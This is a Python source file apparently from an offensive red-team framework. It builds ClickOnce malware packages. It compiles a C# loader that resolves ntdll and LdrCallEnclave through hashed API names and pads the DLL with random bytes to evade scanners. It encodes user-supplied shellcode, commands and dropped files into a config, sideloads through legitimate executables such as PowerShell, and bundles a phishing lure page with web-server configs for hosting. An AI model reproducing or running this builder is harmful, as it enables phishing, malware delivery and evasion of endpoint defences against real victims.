import os
import re
import traceback
import shutil
import json
import random
import string
from base64 import b64decode, b64encode
from tempfile import TemporaryDirectory
from string import Template
import zipfile
from pathlib import Path

from .models import CFCOPayload
from .logging import PerRequestLogger, GlobalLogger
from .hasher import get_api_hash
from .misc import run_cmd_check_file
from .mutator import Mutator
from .consts import (
    BUILD_DIR, SRC_TEMPLATE_DIR, BIN_TEMPLATE_DIR,
    WEBSERVER_CONFIG_DIR, PHISH_TEMPLATE_DIR, ALLOWED_PHISH_TEMPLATES,
    SIDELOAD_OPTIONS, BUILD_CMD, DATA_CS_SIZE_IN_MB,
    TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
)

class Builder:
    def __init__(self, buildid: str, payload: CFCOPayload):
        """Class responsible for building payloads"""
        self.buildid = buildid
        self.build_dir = os.path.join(BUILD_DIR, buildid)
        self._temp_dir = TemporaryDirectory(delete=False)
        self.temp_dir = self._temp_dir.name
        self.payload = payload
        self.logger = PerRequestLogger(buildid)
        self.tgt_dll = os.path.join(self.temp_dir, "bin", "x64", "Release", f"{self.payload.name}.dll")
        self.sideload_exe = None

    def verify(self):
        """Verify incoming payload"""

        # Check name
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
            raise Exception("Application Name does not match provided regex")
        
        # Check inflate size
        if self.payload.inflate > 500 or self.payload.inflate < 0:
            raise Exception("Invalid payload inflation size")
        
        # Check sideload options
        if self.payload.sideload.lower() not in SIDELOAD_OPTIONS:
            raise Exception("Invalid Sideload option provided")
        
        self.logger.debug("Validated all parameters")

    def copy_template_files(self):
        """Copy template files to temporary directory"""
        shutil.copytree(SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
        self.logger.debug("Copied template files from %s to %s", SRC_TEMPLATE_DIR, self.temp_dir)
        # Replace template icon if a custom one was supplied
        if self.payload.icon:
            icon_path = os.path.join(self.temp_dir, "icon.ico")
            with open(icon_path, "wb") as f:
                f.write(b64decode(self.payload.icon))
            self.logger.debug("Replaced icon.ico with custom upload")

    def template_files(self):
        """Generate random keys"""

        # Rename project.application 
        os.rename(
            os.path.join(self.temp_dir, "project.csproj"),
            os.path.join(self.temp_dir, f"{self.payload.name}.csproj")
        )

        # Rename project.manifest 
        os.rename(
            os.path.join(self.temp_dir, "project.manifest"),
            os.path.join(self.temp_dir, f"{self.payload.name}.manifest")
        )

        # Rename project.application
        os.rename(
            os.path.join(self.temp_dir, "project.application"),
            os.path.join(self.temp_dir, f"{self.payload.name}.application")
        )

        # First we template the Program.cs
        program_cs = os.path.join(self.temp_dir, "Program.cs")
        with open(program_cs, 'r') as f:
            content = f.read()
            ntdll_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
            ldrce_key = random.randint(0, 18446744073709551615) & 0x7FFFFFFFFFFFFFFF
            ntdll_hash = get_api_hash("ntdll.dll", ntdll_key)
            ldrce_hash = get_api_hash("LdrCallEnclave", ldrce_key)
            content = content.replace("NTDLL_KEY", hex(ntdll_key)).replace("LDRCE_KEY", hex(ldrce_key))
            content = content.replace("NTDLL_HASH", ntdll_hash).replace("LDRCE_HASH", ldrce_hash)
            content = content.replace("REPLACENAMESPACE", self.payload.name)
            with open(program_cs, 'w') as fw:
                fw.write(content)
                self.logger.debug("Generated NTDLL hash: %s using key: %s", ntdll_hash, hex(ntdll_key))
                self.logger.debug("Generated LdrCallEnclave hash: %s using key: %s", ldrce_hash, hex(ldrce_key))

        # Create Data.cs file
        data_cs_file = os.path.join(self.temp_dir, "Data.cs")
        
        with open(data_cs_file, 'w') as f:
            template_1 = """
                namespace REPLACENAMESPACE
                {
                    internal class Data
                    {

                        private static readonly byte[] data = new byte[]
                        {
                        """.replace("REPLACENAMESPACE", self.payload.name)

            template_2 = """
                        };

                        static unsafe void REPLACEFUNCNAME()
                        {
                            fixed (byte* ptr = data)
                            {
                            }
                        }
                    }
                }""".replace("REPLACEFUNCNAME", ''.join(random.choices(string.ascii_letters, k=16)))
            f.write(template_1)

            # Cap Data.cs at DATA_CS_SIZE_IN_MB; remaining inflation is done post-compile in inflate_artefact()
            data_cs_size = self.payload.inflate if self.payload.inflate <= DATA_CS_SIZE_IN_MB else DATA_CS_SIZE_IN_MB
            self.logger.debug("Creating Data.cs to inflate payloads by an extra %d MBs", data_cs_size)
            data_cs_size = data_cs_size * 1024 * 1024
            for i in range(int(data_cs_size/32)):
                byte_str = str(list(os.urandom(1*32))).replace("[", "").replace("]", ",\n")
                f.write(byte_str)

            f.write(template_2)
            self.logger.debug("Generated Data.cs with size: %ld", os.stat(data_cs_file).st_size)

    def compile_artefacts(self):
        """Compile artefacts"""

        self.logger.debug("Building artefacts with: %s", BUILD_CMD)
        curr_dir = os.getcwd()
        os.chdir(self.temp_dir)
        run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger)
        os.chdir(curr_dir)

    def generate_phish_page(self):
        """Write index.html lure page from selected phish template.
        {{provider_url}} is substituted with the relative ClickOnce path."""
        template_name = self.payload.phish_template
        if template_name not in ALLOWED_PHISH_TEMPLATES:
            self.logger.warning("Unknown phish template '%s', falling back to it_portal", template_name)
            template_name = "it_portal"
        template_path = os.path.join(PHISH_TEMPLATE_DIR, f"{template_name}.html")
        try:
            with open(template_path, "r", encoding="utf-8") as f:
                html = f.read()
        except FileNotFoundError:
            self.logger.warning("Phish template not found: %s, using fallback", template_path)
            fallback = os.path.join(PHISH_TEMPLATE_DIR, "it_portal.html")
            try:
                with open(fallback, "r", encoding="utf-8") as f:
                    html = f.read()
            except FileNotFoundError as exc:
                raise FileNotFoundError(
                    f"Primary phish template '{template_name}' and fallback 'it_portal' both missing"
                    f" — check {PHISH_TEMPLATE_DIR} is mounted"
                ) from exc
        clickonce_link = f"clickonce/{self.payload.name}.application"
        html = html.replace("{{provider_url}}", clickonce_link)
        phish_path = os.path.join(self.build_dir, "index.html")
        with open(phish_path, "w", encoding="utf-8") as f:
            f.write(html)
        self.logger.debug("Wrote index.html using phish template '%s'", template_name)

    def inflate_artefact(self):
        """Append random bytes to the compiled DLL post-build to reach target inflate size.
        Appended data is ignored by the PE loader; no compiler memory pressure."""
        extra_mb = self.payload.inflate - DATA_CS_SIZE_IN_MB
        if extra_mb <= 0:
            return
        self.logger.debug("Post-compile inflating DLL by %d MB", extra_mb)
        with open(self.tgt_dll, 'ab') as f:
            for _ in range(extra_mb):
                f.write(os.urandom(1024 * 1024))
        self.logger.debug("Post-compile inflation complete; DLL size now %d bytes", os.stat(self.tgt_dll).st_size)

    def create_json(self):
        build_json = list()
        for action in self.payload.action:
            a_type = action['type']
            
            # Run shellcode
            if a_type == "run_code":
                b64_encoded = action['file']       
                decoded_payload = list(b64decode(b64_encoded))

                mutator = Mutator(decoded_payload)
                # TODO: Uncomment this
                mutator.inflate = True
                enc_shellcode = b64encode(mutator.generate(self.logger)).decode(encoding='utf-8')
                build_json.append(
                    {
                        "action": 1,
                        "value": enc_shellcode
                    }
                )

            # Run CMD  
            if a_type == "run_cmd":
                build_json.append(
                    {
                        "action": 2,
                        "value": b64encode(action["cmd"].encode()).decode(encoding='utf-8')
                    }
                )

            # Drop file
            if a_type == "drop_file":
                b64_encoded = action['file']
                decoded_payload = list(b64decode(b64_encoded))
                mutator = Mutator(decoded_payload)
                # TODO: Uncomment this
                # mutator.inflate = True
                enc_file = b64encode(mutator.generate(self.logger)).decode(encoding='utf-8')
                
                # Drop location
                enc_filepath = b64encode(action["location"].encode()).decode(encoding='utf-8')

                build_json.append(
                    {
                        "action": 3,
                        "value": [
                            enc_file,
                            enc_filepath
                        ]
                    }
                )

        config_json_file =  os.path.join(self.build_dir, "config.json.deploy")
        with open(config_json_file, 'w') as f:
            json.dump(build_json, f, indent=4)    
            self.logger.info("Created config file at: %s", config_json_file)

    def prepare_files_in_build_dir(self):
        """Put files in build dir, and template them wherever required"""
        
        # Copy sideload exe into build dir
        if (self.payload.sideload.lower() == "tzsync"): 
            self.sideload_exe = TZSYNC
        if (self.payload.sideload.lower() == "perfwatson2"):
            self.sideload_exe = PERFWATSON
        if (self.payload.sideload.lower() == "systemhost"):
            self.sideload_exe = SVCHUB
        if (self.payload.sideload.lower() == "powershell"): 
            self.sideload_exe = POWERSHELL

        shutil.copy(self.sideload_exe.path, self.build_dir)

        # Copy built artefact to build dir
        shutil.copy(self.tgt_dll, os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy"))
        shutil.copy(
            os.path.join(self.temp_dir, "bin", "x64", "Release", "Newtonsoft.Json.dll"),
            os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy")
        )

        # Create .config file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.exe.config.deploy"), 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy"), 'w') as fw:
                fw.write(contents.replace("REPLACEASSEMBLYNAME", self.payload.name))
        
        # prepare .manifest file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.manifest") , 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.payload.name}.manifest"), 'w') as fw:
                fw.write(
                    Template(contents).safe_substitute(
                        clickonce_name = self.payload.name,
                        dll_size=os.stat(self.tgt_dll).st_size,
                        newtonsoft_dll_size=os.stat(
                            os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy")
                        ).st_size,
                        config_size = os.stat(
                            os.path.join(self.build_dir, "config.json.deploy")
                        ).st_size,
                        assembly_name = self.sideload_exe.name,
                        assembly_version = self.sideload_exe.version,
                        assembly_key = self.sideload_exe.key,
                        assembly_size = self.sideload_exe.size,
                        assembly_config_size = os.stat(
                            os.path.join(
                                self.build_dir, f"{self.sideload_exe.exe}.config.deploy"
                            )
                        ).st_size
                    )
                ) 

        # prepare .application file
        with open(os.path.join(SRC_TEMPLATE_DIR, "project.application") , 'r') as f:
            contents = f.read()
            with open(os.path.join(self.build_dir, f"{self.payload.name}.application"), 'w') as fw:
                fw.write(
                    Template(contents).safe_substitute(
                        clickonce_name = self.payload.name,
                        manifest_size = os.stat(
                            os.path.join(self.build_dir, f"{self.payload.name}.manifest")
                        ).st_size,
                        publisher = self.payload.publisher,
                        description = self.payload.description or self.payload.name,
                    )
                )

    def zip_file(self):
        """Package build artifacts.

        Zip layout:
          index.html          ← phishing lure page
          web.config          ┐
          .htaccess           │ server configs at root so operator drops them
          nginx-mime.conf     │ into the web root alongside index.html
          Caddyfile-mime      ┘
          clickonce/          ← all ClickOnce files in a subdirectory
            *.application
            *.manifest
            *.deploy
        """
        target_extensions = ('.deploy', '.manifest', '.application')
        source_path = Path(self.build_dir)

        matching_files = []
        for ext in target_extensions:
            matching_files.extend(source_path.glob(f'**/*{ext}'))

        if not matching_files:
            raise Exception("No files to zip found")

        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
        with zipfile.ZipFile(Path(output_zip), 'w', zipfile.ZIP_DEFLATED) as zipf:
            # ClickOnce deployment files → clickonce/ subfolder
            for file_path in matching_files:
                if file_path.is_file():
                    relative_path = file_path.relative_to(source_path)
                    zipf.write(file_path, os.path.join("clickonce", str(relative_path)))
                    os.remove(file_path)
                    self.logger.debug("Added clickonce/%s", relative_path)

            # Phish / lure page → root (remove from build_dir so it doesn't shadow directory listing)
            index_path = os.path.join(self.build_dir, "index.html")
            if os.path.isfile(index_path):
                zipf.write(index_path, "index.html")
                os.remove(index_path)
                self.logger.debug("Added index.html")

            # Web server MIME configs → root (operator drops alongside index.html)
            if os.path.isdir(WEBSERVER_CONFIG_DIR):
                for fname in os.listdir(WEBSERVER_CONFIG_DIR):
                    src = os.path.join(WEBSERVER_CONFIG_DIR, fname)
                    if os.path.isfile(src):
                        zipf.write(src, fname)
                        self.logger.debug("Added server config: %s", fname)

        self.logger.info("Created '%s' with %d ClickOnce files", output_zip, len(matching_files))

def build_func(buildid: str, inc_req: CFCOPayload):
    """Build the payload"""
    builder = None
    try:
        builder = Builder(buildid, inc_req)
        builder.logger.debug("%s", inc_req)

        if not os.path.exists(SRC_TEMPLATE_DIR):
            builder.logger.error("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
            raise FileNotFoundError(f"Source Template Directory {SRC_TEMPLATE_DIR} not found")

        builder.verify()
        builder.copy_template_files()
        builder.template_files()
        builder.compile_artefacts()
        builder.inflate_artefact()
        builder.create_json()
        builder.prepare_files_in_build_dir()
        builder.generate_phish_page()
        builder.zip_file()

        meta_path = os.path.join(builder.build_dir, "build-meta.json")
        with open(meta_path, "w") as f:
            json.dump({"type": "cfco", "name": inc_req.name}, f)

        builder.logger.info("Build complete")

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        if builder is not None:
            builder.logger.error("Build failed: %s", e)
